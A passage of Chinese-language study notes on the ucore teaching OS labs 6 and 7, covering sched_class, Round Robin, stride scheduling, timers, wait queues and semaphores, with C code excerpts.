hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the </span><br><span class="hljs-comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate </span><br><span class="hljs-comment">// the scheduling policies. </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_class</span> &#123;</span><br>    <span class="hljs-comment">// the name of sched_class</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-comment">// Init the run queue</span><br>    <span class="hljs-keyword">void</span> (*init)(struct run_queue *rq);<br>    <span class="hljs-comment">// put the proc into runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// get the proc out runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// choose the next runnable task</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *(*<span class="hljs-title">pick_next</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">run_queue</span> *<span class="hljs-title">rq</span>);</span><br>    <span class="hljs-comment">// dealer of the time-tick</span><br>    <span class="hljs-keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">/* for SMP support in the future</span><br><span class="hljs-comment">     *  load_balance</span><br><span class="hljs-comment">     *     void (*load_balance)(struct rq* rq);</span><br><span class="hljs-comment">     *  get some proc from this rq, used in load_balance,</span><br><span class="hljs-comment">     *  return value is the num of gotten proc</span><br><span class="hljs-comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span><br><span class="hljs-comment">     */</span><br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>上面的代码即为sched_class, 如果要使用函数指针只要sched_class-&gt;init(…)这样即可</p><p>时间片轮转算法在os_kernel_lab\labcodes\lab6\kern\schedule\default_sched.c中, 给每个进程分配时间片的FCFS算法, 简单的入队出队, RR_proc_tick()自减剩余时间片, 判断是否为零, 设置need_resched=1等等, 并不复杂.</p><p>在实验报告中完成：</p><ul><li>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">next</span>;</span><br>    local_intr_save(intr_flag);  <span class="hljs-comment">//inhibit interrupt</span><br>    &#123;<br>        current-&gt;need_resched = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;<br>            <span class="hljs-comment">//change from list search to function</span><br>            sched_class_enqueue(current);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((next = sched_class_pick_next()) != <span class="hljs-literal">NULL</span>) &#123;<br>            sched_class_dequeue(next);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) &#123;<br>            next = idleproc;<br>        &#125;<br>        next-&gt;runs ++;<br>        <span class="hljs-keyword">if</span> (next != current) &#123;<br>            proc_run(next);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先是schedule函数, 他被调用的函数在下表:</p><table><thead><tr><th>编号</th><th>位置</th><th>原因</th></tr></thead><tbody><tr><td>1</td><td>proc.c::do_exit</td><td>用户线程执行结束，主动放弃CPU控制权。</td></tr><tr><td>2</td><td>proc.c::do_wait</td><td>用户线程等待子进程结束，主动放弃CPU控制权。</td></tr><tr><td>3</td><td>proc.c::init_main</td><td>1. initproc内核线程等待所有用户进程结束，如果没有结束，就主动放弃CPU控制权; 2. initproc内核线程在所有用户进程结束后，让kswapd内核线程执行10次，用于回收空闲内存资源</td></tr><tr><td>4</td><td>proc.c::cpu_idle</td><td>idleproc内核线程的工作就是等待有处于就绪态的进程或线程，如果有就调用schedule函数</td></tr><tr><td>5</td><td>sync.h::lock</td><td>在获取锁的过程中，如果无法得到锁，则主动放弃CPU控制权</td></tr><tr><td>6</td><td>trap.c::trap</td><td>如果在当前进程在用户态被打断去，且当前进程控制块的成员变量need_resched设置为1，则当前线程会放弃CPU控制权(<strong>这个感觉挺特别的, 如果需要被调度, 那么只要因为个什么软中断跳转到内核状态进行执行的时候就会放弃控制权. 这实际上体现了对用户进程的可抢占性, 而且是随机抢占</strong>)</td></tr></tbody></table><p>选取下一个完成之后, next变量作为proc_run()的参数进而执行next中的进程.</p><ul><li>请在实验报告中简要说明如何设计实现”多级反馈队列调度算法“，给出概要设计，鼓励给出详细设计</li></ul><p><strong>多级反馈队列算法（MLFQ)</strong> </p><p>进程可<strong>在不同队列间移动</strong>的多级队列算法, 时间片大小随优先级级别的增加而增加,<br>例如进程在当前时间片内没有完成，则降到下一个优先级。</p><p>特征：CPU密集型进程优先级下降的很快，IO密集型进程停留在高优先级</p><p><strong>大概设计:</strong> </p><p>多级反馈队列要有多个<code>run_queue</code>, 每个queue的时间片不同.</p><blockquote><p>假设有三个run_queue, rq0, rq1, rq2, 固定时间片为5, 队列间调度使用RR算法, 时间片长度为10, 8, 6</p></blockquote><ul><li><p>sched_init(): 首先list_init()一下三个rq, 将函数指针结构体赋值一下, 设置当前rq=rq0</p></li><li><p>sched_class_proc_tick: 在时钟中断里被调用, 如果当前时间片用完了, 则设置need_resched为1</p></li><li><p>sched_pick_next: 判断当前queue时间片以及当前进程时间片是否用完, 前者用完则rq切换到下一个queue, 后者用完rq不变, 从rq取出第一个进程</p></li><li><p>sched_enqueue: 通过run_times判断为CPU密集或者IO密集, 通过设定阈值来加入到三个不同的queue中</p></li><li><p>sched_dequeue: delete就完事了</p></li></ul><h3 id="练习2-3"><a href="#练习2-3" class="headerlink" title="练习2"></a>练习2</h3><p><a href="http://www.waldspurger.org/carl/papers/phd-mit-tr667.pdf">Lottery and Stride算法论文</a> | <a href="https://people.cs.umass.edu/~mcorner/courses/691J/papers/PS/waldspurger_stride/waldspurger95stride.pdf">节选重要的部分</a> </p><p>uCore的Round-Robin算法可以保证每个进程得到的CPU资源是相等的，但我们希望调度器能够更加智能的为每个进程分配合理的CPU资源，让<strong>每个进程得到的时间资源与它们的优先级成正比关系</strong>。而Stride Scheduling调度算法就是这样的一种典型而简单的算法。</p><p>其中，该算法的有如下几个特点：</p><ul><li>实现简单</li><li>可控性：可以证明Stride Scheduling对进程的调度次数正比于其优先级</li><li>确定性：在不考虑计时器事件的情况下，整个调度机制都是可预知和重现的。</li></ul><p>而该算法的基本思想如下：</p><ol><li>为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。</li><li>每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。</li><li>对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。</li><li>在一段固定的时间之后，回到 2.步骤，重新调度当前stride最小的进程。</li></ol><blockquote><p>可以证明，如果令 P.pass = BigStride / P.priority 其中 P.priority 表示进程的优先权（大于 1），而 BigStride 表示一个预先定义的大常数，则该调度方案为每个进程分配的时间将与其优先级成正比。</p></blockquote><p>代码:</p><ul><li><p><code>stride_init</code> </p><p>lab6_run_pool就是一个ucore库自带的一个heap实现, 一开始置空. 后面的增删操作都是使用已经提供的接口.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_init</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    list_init(&amp;(rq-&gt;run_list));<br>    <span class="hljs-comment">// 这里不能使用skew_heap_init(rq-&gt;lab6_run_pool)</span><br>    rq-&gt;lab6_run_pool = <span class="hljs-literal">NULL</span>;<br>    rq-&gt;proc_num = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_enqueue</code> + <code>stride_dequeue</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_enqueue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-comment">//insert函数返回heap的顶端, 用来更新lab6_run_pool</span><br>    rq-&gt;lab6_run_pool = skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    <span class="hljs-comment">//不知道什么时候会变成大于max, 估计是溢出</span><br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;<br>        proc-&gt;time_slice = rq-&gt;max_time_slice;<br>    &#125;<br>    proc-&gt;rq = rq;<br>    rq-&gt;proc_num ++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_dequeue</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>    rq-&gt;lab6_run_pool = skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);<br>    rq-&gt;proc_num --;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>pick_next</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">proc_stride_comp_f</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *a, <span class="hljs-keyword">void</span> *b)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">p</span> =</span> le2proc(a, lab6_run_pool);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">q</span> =</span> le2proc(b, lab6_run_pool);<br>     <span class="hljs-keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;<br>     <span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">stride_pick_next</span><span class="hljs-params">(struct run_queue *rq)</span> </span>&#123;<br>    <span class="hljs-keyword">skew_heap_entry_t</span>* she = rq-&gt;lab6_run_pool;<br>    <span class="hljs-keyword">if</span> (she != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span>* <span class="hljs-title">p</span> =</span> le2proc(she, lab6_run_pool);<br>        p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p><code>stride_proc_tick</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stride_proc_tick</span><span class="hljs-params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span> (proc-&gt;time_slice &gt; <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;time_slice --;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (proc-&gt;time_slice == <span class="hljs-number">0</span>) &#123;<br>        proc-&gt;need_resched = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="Challenge-1-1"><a href="#Challenge-1-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><blockquote><p>实现 Linux 的 CFS 调度算法 <a href="https://developer.ibm.com/tutorials/l-completely-fair-scheduler/">link</a> | <a href="https://cs334.cs.vassar.edu/slides/04_Linux_CFS.pdf">和nice的关系</a> </p></blockquote><p>Completely Fair Scheduling, which is self-explanatory, is to maintain balance (fairness) in providing processor time to tasks.</p><h1 id="Lab7"><a href="#Lab7" class="headerlink" title="Lab7"></a>Lab7</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><h3 id="00-基础原理"><a href="#00-基础原理" class="headerlink" title="00.基础原理"></a>00.<a href="https://kiprey.github.io/2020/09/uCore-7/#%E7%9F%A5%E8%AF%86%E7%82%B9">基础原理</a></h3><h3 id="0-项目组成-3"><a href="#0-项目组成-3" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><ul><li>kern/schedule/{sched.h,sched.c}: 增加了定时器（timer）机制，用于进程/线程的do_sleep功能。</li><li>kern/sync/sync.h: <strong>去除了lock实现（这对于不抢占内核没用。</strong> </li><li>kern/sync/wait.[ch]: 定义了等待队列wait_queue结构和等待entry的wait结构以及在此之上的函数，这是ucore中的信号量semophore机制和条件变量机制的基础，在本次实验中你需要了解其实现。</li><li>kern/sync/sem.[ch]:定义并实现了ucore中内核级信号量相关的数据结构和函数，本次试验中你需要了解其中的实现，并基于此完成内核级条件变量的设计与实现。</li><li>user/ libs/ {syscall.[ch],ulib.[ch] }与kern/sync/syscall.c：实现了进程sleep相关的系统调用的参数传递和调用关系。</li><li>user/{ sleep.c,sleepkill.c}: 进程睡眠相关的一些测试用户程序。</li><li>kern/sync/monitor.[ch]:基于管程的条件变量的实现程序，在本次实验中是练习的一部分，要求完成。</li><li>kern/sync/check_sync.c：实现了基于管程的哲学家就餐问题，在本次实验中是练习的一部分，要求完成基于管程的哲学家就餐问题。</li><li>kern/mm/vmm.[ch]：用信号量mm_sem取代mm_struct中原有的mm_lock。（本次实验不用管）</li></ul><h3 id="1-定时器相关"><a href="#1-定时器相关" class="headerlink" title="1.定时器相关"></a>1.定时器相关</h3><p>在<code>sched.h</code>中定义了定时器中断相关的函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sched_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_proc</span><span class="hljs-params">(struct proc_struct *proc)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// add timer to timer_list</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">del_timer</span><span class="hljs-params">(<span class="hljs-keyword">timer_t</span> *timer)</span></span>;     <span class="hljs-comment">// del timer from timer_list</span><br><span class="hljs-comment">// call scheduler to update tick related info, and check the timer is expired? If expired, then wakup proc</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_timer_list</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><p>add_timer函数只在do_sleep中会被用到, 用于设定sleep的时长, 然后通过时钟中断里的run_timer_lsit来找到expired的进程, 从而继续执行.</p><h3 id="2-等待队列实现"><a href="#2-等待队列实现" class="headerlink" title="2.等待队列实现"></a>2.等待队列实现</h3><h4 id="基本结构和函数"><a href="#基本结构和函数" class="headerlink" title="基本结构和函数"></a>基本结构和函数</h4><p>需要等待事件的进程在转入休眠状态后插入到等待队列中。当事件发生之后，内核遍历相应等待队列，唤醒休眠的用户进程或内核线程，并设置其状态为就绪状态（PROC_RUNNABLE），并将该进程从等待队列中清除。ucore在kern/sync/{ wait.h, wait.c }中实现了等待项wait结构和等待队列wait queue结构以及相关函数），这是实现ucore中的信号量机制和条件变量机制的基础</p><blockquote><p>总结一下, 到目前为止出现了几个queue, 一个是放着所有进程的proc_list, 用于get_pid(), kern_thread()等等函数; 第二个是<code>struct run_queue *rq</code>, 即运行队列, 当然不仅仅只是一个链表头, 也可以是heap的head; 第三个是这里的等待队列wait_queue, 实现在下面:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;数据结构&quot;</span><br><span class="hljs-keyword">typedef</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span>     <span class="hljs-comment">//等待进程的指针</span><br>    <span class="hljs-keyword">uint32_t</span> wakeup_flags;        <span class="hljs-comment">//进程被放入等待队列的原因标记</span><br>    <span class="hljs-keyword">wait_queue_t</span> *wait_queue;     <span class="hljs-comment">//指向此wait结构所属于的wait_queue</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_link;       <span class="hljs-comment">//用来组织wait_queue中wait节点的连接</span><br>&#125; <span class="hljs-keyword">wait_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> wait_head;       <span class="hljs-comment">//wait_queue的队头</span><br>&#125; <span class="hljs-keyword">wait_queue_t</span>;<br><br>le2wait(le, member)               <span class="hljs-comment">//实现wait_t中成员的指针向wait_t 指针的转化</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;底层相关函数, 定义queue级别的操作, wakeup等操作是由高层函数实现的&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait, struct proc_struct *proc)</span></span>;    <span class="hljs-comment">//初始化wait结构</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_in_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_t</span> *wait)</span></span>;                          <span class="hljs-comment">//wait是否在wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_init</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                 <span class="hljs-comment">//初始化wait_queue结构</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_add</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//把wait前插到wait queue中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_queue_del</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;    <span class="hljs-comment">//从wait queue中删除wait</span><br><span class="hljs-comment">//下两个参数中的queue用于assert检查</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_next</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的后一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_prev</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait)</span></span>;<span class="hljs-comment">//取得wait的前一个链接指针</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;             <span class="hljs-comment">//取得wait queue的第一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">wait_t</span> *<span class="hljs-title">wait_queue_last</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;              <span class="hljs-comment">//取得wait queue的最后一个wait</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">wait_queue_empty</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>)</span></span>;                <span class="hljs-comment">//wait queue是否为空</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;高层函数&quot;</span><br><span class="hljs-comment">//让wait与进程关联，且让当前进程关联的wait进入等待队列queue，当前进程睡眠</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_set</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wait_state)</span></span>;<br><span class="hljs-comment">//把与当前进程关联的wait从等待队列queue中删除</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wait_current_del</span><span class="hljs-params">(<span class="hljs-built_in">queue</span>, wait)</span></span>;<br><span class="hljs-comment">//下面三个函数中的del是指是否删除</span><br><span class="hljs-comment">//唤醒与wait关联的进程, 调用wakeup_proc()-&gt;sche_class_enqueue()把proc加入到rq里</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_wait</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">wait_t</span> *wait, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上挂着的第一个wait所关联的进程</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_first</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br><span class="hljs-comment">//唤醒等待队列上所有的等待的进程, 会调用wakeup_wait和wait_queue_first(next)</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">wakeup_queue</span><span class="hljs-params">(<span class="hljs-keyword">wait_queue_t</span> *<span class="hljs-built_in">queue</span>, <span class="hljs-keyword">uint32_t</span> wakeup_flags, <span class="hljs-keyword">bool</span> del)</span></span>;<br></code></pre></div></td></tr></table></figure><p>内核前面的流程还是一样的, 由proc_init()函数创建第一个内核进程idleproc, 然后调用kern_thread()创建第二个内核进程initproc, 这个进程会执行init_main函数. 但是一切都还未发生, 直到cpu_idle()函数发现当前(idleproc)的need_resched==1, 换成initproc开始执行, 在这个lab中init_main加上了check_sync()用来检查哲学家思考问题.</p><p>下面是调用关系示例:</p><h4 id="up-V操作"><a href="#up-V操作" class="headerlink" title="__up(): V操作"></a>__up(): V操作</h4><p><img src="../../image/ucore/up.gif" alt="up"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">void</span> __up(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//屏蔽中断</span><br>        <span class="hljs-keyword">wait_t</span> *wait;<br>        <span class="hljs-keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="hljs-literal">NULL</span>) <br>        &#123;<span class="hljs-comment">//意味着没有等待的进程</span><br>            sem-&gt;value ++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则要唤醒</span><br>            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br></code></pre></div></td></tr></table></figure><h4 id="down-P操作"><a href="#down-P操作" class="headerlink" title="__down(): 